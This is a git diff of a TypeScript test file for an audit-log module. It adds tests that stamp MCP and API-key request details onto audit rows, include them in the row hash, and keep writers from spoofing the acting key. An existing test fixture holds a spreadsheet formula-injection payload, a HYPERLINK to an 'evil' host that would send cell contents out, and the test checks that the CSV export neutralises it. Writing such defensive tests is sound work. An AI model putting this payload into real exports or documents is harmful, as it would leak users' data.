@@ -13,8 +13,9 @@ import {
   retryQueueKeyOf,
 } from '@tale/shared/db/serializable';
 import type { Sql, TransactionSql } from 'postgres';
-import { describe, expect, it } from 'vitest';
+import { describe, expect, it, vi } from 'vitest';
 
+import { runInRequestChannel } from '../../lib/request-channel.ts';
 import {
   auditChainQueueKey,
   buildAuditExport,
@@ -98,7 +99,7 @@ function limitOf(statements: Statement[]): unknown {
   return query?.values.at(-1);
 }
 
-describe('listAuditLogs — page size', () => {
+describe('listAuditLogs — page size [AUDIT-R4]', () => {
   it.each([
     [-5, 2],
     [0, 2],
@@ -153,7 +154,7 @@ describe('buildAuditExport — CSV', () => {
     ...overrides,
   });
 
-  it('neutralises formula prefixes in member-authored cells', async () => {
+  it('neutralises formula prefixes in member-authored cells [AUDIT-R6]', async () => {
     const fake = fakeSql([
       row({
         resourceName: '=HYPERLINK("http://evil/"&A1,"x")',
@@ -241,5 +242,174 @@ describe('createAuditLog — chain-head lock', () => {
     );
     expect(failure).toBeInstanceOf(Error);
     expect(retryQueueKeyOf(failure)).toBeUndefined();
+  });
+});
+
+/**
+ * A write a coding agent caused deep inside a domain says so: the MCP door
+ * runs each tool call in a request channel, and every audit row written
+ * during it carries the door, the tool, the key and the client — stamped
+ * before the row is hashed, so the stored row verifies.
+ */
+describe('createAuditLog — the request channel', () => {
+  const args = {
+    organizationId: 'org_1',
+    actorId: 'u1',
+    actorType: 'user' as const,
+    action: 'automation.run.cancelled',
+    category: 'workflow' as const,
+    resourceType: 'automation_run',
+    resourceId: 'run_1',
+    status: 'success' as const,
+  };
+  const channel = {
+    via: 'mcp' as const,
+    requestId: 'req-mcp-1',
+    tool: 'cancel_run',
+    apiKeyId: 'key_1',
+    clientName: 'Claude Code',
+  };
+
+  /** The INSERT's metadata, request id and integrity hash. */
+  async function insertOf(
+    run: (tx: TransactionSql) => Promise<string>,
+  ): Promise<{ metadata: unknown; requestId: unknown; hash: unknown }> {
+    const fake = fakeTx((statement) => {
+      if (statement.text.includes('FOR UPDATE')) {
+        return [{ lastHash: 'h0', lastTs: 0 }];
+      }
+      if (statement.text.includes('INSERT INTO app.audit_logs')) {
+        return [{ id: 'a1' }];
+      }
+      return [];
+    });
+    Object.assign(fake.tx, { json: (value: unknown) => ({ json: value }) });
+    await run(fake.tx);
+    const insert = fake.statements.find((s) =>
+      s.text.includes('INSERT INTO app.audit_logs'),
+    );
+    const values = insert?.values ?? [];
+    const metadata = values[22];
+    return {
+      metadata:
+        metadata !== null && typeof metadata === 'object' && 'json' in metadata
+          ? metadata.json
+          : metadata,
+      requestId: values[18],
+      hash: values[23],
+    };
+  }
+
+  it('stamps the door, tool, key and client of an MCP call on every row written inside it', async () => {
+    const written = await insertOf((tx) =>
+      runInRequestChannel(channel, () => createAuditLog(tx, args)),
+    );
+    expect(written.metadata).toEqual({
+      via: 'mcp',
+      tool: 'cancel_run',
+      apiKeyId: 'key_1',
+      clientName: 'Claude Code',
+    });
+    expect(written.requestId).toBe('req-mcp-1');
+  });
+
+  it('keeps what the writer said: its own metadata, its own via and its own request id', async () => {
+    const merged = await insertOf((tx) =>
+      runInRequestChannel(channel, () =>
+        createAuditLog(tx, { ...args, metadata: { runId: 'run_1' } }),
+      ),
+    );
+    expect(merged.metadata).toEqual({
+      via: 'mcp',
+      tool: 'cancel_run',
+      apiKeyId: 'key_1',
+      clientName: 'Claude Code',
+      runId: 'run_1',
+    });
+    const own = await insertOf((tx) =>
+      runInRequestChannel(channel, () =>
+        createAuditLog(tx, {
+          ...args,
+          requestId: 'req-own',
+          metadata: { via: 'upload' },
+        }),
+      ),
+    );
+    expect(own.metadata).toEqual({ via: 'upload' });
+    expect(own.requestId).toBe('req-own');
+  });
+
+  it('hashes the stamped row, so it verifies like a row the writer stamped itself', async () => {
+    vi.useFakeTimers();
+    try {
+      vi.setSystemTime(1_760_000_000_000);
+      const inChannel = await insertOf((tx) =>
+        runInRequestChannel(channel, () => createAuditLog(tx, args)),
+      );
+      const explicit = await insertOf((tx) =>
+        createAuditLog(tx, {
+          ...args,
+          requestId: 'req-mcp-1',
+          metadata: {
+            via: 'mcp',
+            tool: 'cancel_run',
+            apiKeyId: 'key_1',
+            clientName: 'Claude Code',
+          },
+        }),
+      );
+      expect(typeof inChannel.hash).toBe('string');
+      expect(inChannel.hash).toBe(explicit.hash);
+    } finally {
+      vi.useRealTimers();
+    }
+  });
+
+  it('adds nothing outside a channel', async () => {
+    const written = await insertOf((tx) => createAuditLog(tx, args));
+    expect(written.metadata).toBeNull();
+    expect(written.requestId).toBeNull();
+  });
+
+  it('names the key that made the call even when the writer records another under the same name [MCP-R14]', async () => {
+    // Ada's agent creates an API key "ci" over MCP with her key "laptop":
+    // the row must point an admin at "laptop", the key that acted.
+    const written = await insertOf((tx) =>
+      runInRequestChannel(channel, () =>
+        createAuditLog(tx, {
+          ...args,
+          metadata: {
+            apiKeyId: 'key_ci',
+            tool: 'something_else',
+            clientName: 'Spoofed',
+            keyName: 'ci',
+          },
+        }),
+      ),
+    );
+    expect(written.metadata).toEqual({
+      via: 'mcp',
+      tool: 'cancel_run',
+      apiKeyId: 'key_1',
+      clientName: 'Claude Code',
+      keyName: 'ci',
+    });
+  });
+
+  it("stamps a REST write made with Ada's key as the key's, with the request id", async () => {
+    const written = await insertOf((tx) =>
+      runInRequestChannel(
+        { via: 'api-key', requestId: 'req-rest-1', apiKeyId: 'key_9' },
+        () => createAuditLog(tx, args),
+      ),
+    );
+    expect(written.metadata).toEqual({ via: 'api-key', apiKeyId: 'key_9' });
+    expect(written.requestId).toBe('req-rest-1');
+    const unnamed = await insertOf((tx) =>
+      runInRequestChannel({ via: 'api-key', apiKeyId: 'key_9' }, () =>
+        createAuditLog(tx, args),
+      ),
+    );
+    expect(unnamed.requestId).toBeNull();
   });
 });
